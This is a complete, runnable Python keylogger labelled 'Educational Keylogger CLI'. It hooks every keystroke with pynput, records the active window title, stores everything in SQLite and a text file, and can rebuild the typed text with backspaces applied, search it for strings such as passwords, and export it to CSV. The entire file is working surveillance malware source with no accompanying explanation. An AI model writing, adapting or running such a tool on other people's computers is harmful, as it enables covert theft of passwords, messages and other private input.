#!/usr/bin/env python3
import argparse, csv, datetime, platform, sqlite3, subprocess
from typing import Optional
from pynput import keyboard

DB_FILE = "keylogs.db"
TXT_FILE = "keylog.txt"
TABLE = "keystrokes"

# ───────────────────── Window capture (Cross-Platform) ─────────────────────
def current_window() -> str:
    system = platform.system()

    if system == "Windows":
        try:
            import pygetwindow as gw
            win = gw.getActiveWindow()
            return win.title if win else ""
        except Exception:
            return ""

    elif system == "Linux":
        try:
            win = subprocess.check_output(['xdotool', 'getactivewindow', 'getwindowname'])
            return win.decode().strip()
        except Exception:
            return ""

    return ""

# ───────────────────── DB Setup ─────────────────────
def init_db() -> None:
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute("PRAGMA synchronous = FULL")
        conn.execute(f"""CREATE TABLE IF NOT EXISTS {TABLE} (
                            id     INTEGER PRIMARY KEY AUTOINCREMENT,
                            ts     TEXT,
                            window TEXT,
                            key    TEXT
                        );""")
        conn.commit()

# ───────────────────── Key formatting ─────────────────────
def fmt_key(k: keyboard.Key | keyboard.KeyCode) -> str:
    if isinstance(k, keyboard.Key):
        return f"[{k.name.upper()}]"
    try:
        return str(k.char)
    except AttributeError:
        return str(k)

# ───────────────────── Logger function ─────────────────────
def on_press(k):
    ts = datetime.datetime.now().isoformat(sep=" ", timespec="seconds")
    win = current_window()
    key = fmt_key(k)

    # Log to SQLite
    conn = sqlite3.connect(DB_FILE)
    conn.execute("PRAGMA synchronous = FULL")
    conn.execute(f"INSERT INTO {TABLE}(ts, window, key) VALUES (?,?,?)", (ts, win, key))
    conn.commit()
    conn.close()

    # Log to TXT file
    with open(TXT_FILE, "a", encoding="utf-8") as f:
        f.write(f"{ts:19} | {win[:40]:40} | {key}\n")

# ───────────────────── Dump logs ─────────────────────
def dump_logs(keyword: Optional[str] = None):
    with sqlite3.connect(DB_FILE) as conn:
        cur = conn.cursor()
        if keyword:
            cur.execute(f"""SELECT ts, window, key FROM {TABLE}
                            WHERE key LIKE ? OR window LIKE ?""",
                        (f"%{keyword}%", f"%{keyword}%"))
        else:
            cur.execute(f"SELECT ts, window, key FROM {TABLE}")
        rows = cur.fetchall()

    if not rows:
        print("[!] No logs found."); return

    hdr = f"{'TIME':19}  {'WINDOW':40}  KEY"
    print(hdr); print("-" * len(hdr))
    for ts, win, key in rows:
        print(f"{ts:19}  {win[:40]:40}  {key}")

# ───────────────────── Smart search with backspaces ─────────────────────
def smart_search(needle: str):
    with sqlite3.connect(DB_FILE) as conn:
        cur = conn.cursor()
        cur.execute(f"SELECT key FROM {TABLE} ORDER BY ts ASC")
        keys = [row[0] for row in cur.fetchall()]

    text = ""
    for key in keys:
        if key == "[SPACE]":
            text += " "
        elif key == "[ENTER]":
            text += "\n"
        elif key == "[BACKSPACE]":
            text = text[:-1]
        elif key.startswith("[") and key.endswith("]"):
            continue
        else:
            text += key

    print("─" * 50)
    print(text)
    print("─" * 50)

    if needle.lower() in text.lower():
        print(f"[✅] FOUND: '{needle}' detected in reconstructed input.")
    else:
        print(f"[❌] NOT FOUND: '{needle}' not found.")

# ───────────────────── Reconstruct all typed input ─────────────────────
def reconstruct_text():
    with sqlite3.connect(DB_FILE) as conn:
        cur = conn.cursor()
        cur.execute(f"SELECT key FROM {TABLE} ORDER BY ts ASC")
        keys = [row[0] for row in cur.fetchall()]

    text = ""
    for key in keys:
        if key == "[SPACE]":
            text += " "
        elif key == "[ENTER]":
            text += "\n"
        elif key == "[BACKSPACE]":
            text = text[:-1]
        elif key.startswith("[") and key.endswith("]"):
            continue
        else:
            text += key

    print("\n───────── RECONSTRUCTED TYPED TEXT ─────────")
    print(text)
    print("────────────────────────────────────────────\n")

# ───────────────────── Export to CSV ─────────────────────
def export_csv(outfile: str):
    with sqlite3.connect(DB_FILE) as conn, open(outfile, "w", newline="", encoding="utf-8") as f:
        cur = conn.cursor()
        cur.execute(f"SELECT ts, window, key FROM {TABLE}")
        csv.writer(f).writerows([["timestamp", "window", "key"], *cur.fetchall()])
    print(f"[+] Exported to {outfile}")

# ───────────────────── Main ─────────────────────
def main():
    ap = argparse.ArgumentParser(
        description="Educational Keylogger CLI:\n"
                    "Run with no args to start logging live.\n"
                    "--dump         = Print all logs\n"
                    "--search TEXT  = Search by key/window match\n"
                    "--smart-search = Rebuild typed content & search\n"
                    "--reconstruct  = Reprint typed content as plain text\n"
                    "--export FILE  = Export logs to CSV file",
        formatter_class=argparse.RawTextHelpFormatter)
    ap.add_argument("--dump",          action="store_true", help="Print all logs")
    ap.add_argument("--search",        metavar="TEXT",      help="Filter logs by exact DB match")
    ap.add_argument("--smart-search",  metavar="TEXT",      help="Rebuild input & search full text")
    ap.add_argument("--reconstruct",   action="store_true", help="Reconstruct full typed text")
    ap.add_argument("--export",        metavar="FILE.csv",  help="Export logs to CSV")
    args = ap.parse_args()

    init_db()

    if args.dump or args.search:
        dump_logs(args.search); return
    if args.smart_search:
        smart_search(args.smart_search); return
    if args.reconstruct:
        reconstruct_text(); return
    if args.export:
        export_csv(args.export); return

    print("[*] Keylogger running (Ctrl+C to stop)…")
    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        print(f"\n[+] Stopped. Logs stored in {DB_FILE} and {TXT_FILE}")

if __name__ == "__main__":
    main()

